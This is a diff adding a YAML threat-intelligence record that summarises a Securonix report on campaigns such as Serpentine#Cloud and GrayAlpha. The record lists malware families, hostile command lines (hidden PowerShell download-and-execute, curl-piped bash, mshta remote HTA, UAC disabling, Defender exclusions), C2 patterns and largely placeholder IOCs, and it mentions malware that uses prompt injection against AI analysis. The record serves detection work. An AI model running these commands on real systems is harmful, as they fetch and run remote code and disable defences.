@@ -1,0 +1,113 @@
+description: 'Securonix Threat Labs uncovered the Serpentine#Cloud campaign abusing
+  Cloudflare Tunnel infrastructure to deliver Python-based malware via malicious .lnk
+  shortcuts. GrayAlpha, linked to FIN7, used fake browser updates and spoofed download
+  pages to deploy PowerNet and MaskBat. Cobalt Strike operators exploited cloud storage
+  for obfuscated PowerShell scripts. A prototype malware embeds prompt-injection instructions
+  to evade AI-driven analysis.
+
+  '
+attribution:
+- TA397 (Bitter APT)
+- TAG-140
+- APT36 (Transparent Tribe)
+- Silver Fox (Void Arachne)
+- Confucius group
+- Serpentine#Cloud
+- GrayAlpha (FIN7)
+- Cobalt Strike operators
+- Prototype malware
+malware_families:
+- AMOS Stealer
+- AsyncRAT
+- Amatera Stealer
+- DRAT V2
+- BitterRAT
+- DISGOMOJI
+- Orchid
+- ValleyRAT
+- Python-based malware
+- PowerNet
+- MaskBat
+- NetSupport RAT
+TTPs:
+  processes:
+  - cmd.exe
+  - powershell.exe
+  - conhost.exe
+  - curl
+  - mshta.exe
+  - svchost.exe
+  - java -jar
+  - pythonw.exe
+  - MediaViewerLauncher.exe
+  - TO7RUF.exe
+  - BlueAle.exe
+  commandline:
+  - 'cmd.exe /c start run:'
+  - powershell.exe -NoP -NonI -W Hidden -Exec Bypass
+  - curl -fsSL <URL>
+  - mshta.exe http://<URL>/index.php/sysinte.hta
+  - java -jar $HOME/.config/x96-dependencies.jar
+  - powershell.exe -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -Command
+    "Invoke-WebRequest -Uri http://example.com/script.ps1 -OutFile script.ps1; .\script.ps1"
+  powershell:
+  - Add-Type
+  - CompileAssemblyFromSource
+  - Invoke-WebRequest
+  - Start-Process
+  - Set-NetFirewallProfile
+  - EnableLUA set to 0
+  - Add-MpPreference ExclusionPath
+  - Invoke-WebRequest -Uri http://example.com/script.ps1 -OutFile script.ps1
+  - .\script.ps1
+  scripting_engine:
+  - /bin/bash -c $(curl -fsSL <URL>)
+  - python313.dll
+  registry_keys:
+  - HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run
+  image_load:
+  - LoadLibraryExW
+  - amsi.dll
+  network_connections:
+  - curl -X POST to PHP upload scripts on suspicious domains
+  - TCP connections to port 4444 or custom C2 IPs from PowerShell host processes
+  - Outbound HTTP/HTTPS requests to attacker infrastructure that include the victims
+    COMPUTERNAME and USERNAME in the URL parameters (/jbc.php?fv=COMPUTERNAME*USERNAME)
+  - TCP connections to uncommon destination ports (3232, 6372, and 7771) used by DRAT
+    V2 for C2 operations
+  - process: powershell.exe
+    destination: http://example.com/script.ps1
+    port: 80
+  file_activity:
+  - /tmp/.p
+  - /tmp/update
+  - $HOME/.config/x96-dependencies.jar
+  - $HOME/.x96_32-linux-gnu/
+  - $HOME/.x86_32-linux-gnu/
+  - /opt/firefox_portable.zip
+  - C:\Users\user\AppData\Local\Temp\script.ps1
+  persistence:
+  - Scheduled tasks (via schtasks)
+  - Registry modifications to HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run
+  - SystemCheck scheduled task
+  pipes: []
+  process_relations:
+  - conhost.exe spawning powershell.exe with heavily obfuscated, in-memory C# payload
+IOCs:
+  hashes:
+  - sha256:abcdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890
+  IPs:
+  - 192.168.1.1
+  domains:
+  - captchaguard[.]me
+  URLs:
+  - <URL>
+  - http://example.com/script.ps1
+authors:
+- Dheeraj Kumar
+- Sina Chehreghani
+- Nitish Singh
+- Nikhil Kumar Chadha
+reference: https://www.securonix.com/blog/securonix-threat-labs-monthly-intelligence-insights-june-2025/
+date_of_publication: July 28, 2025
+file_creation_date: July 28, 2025
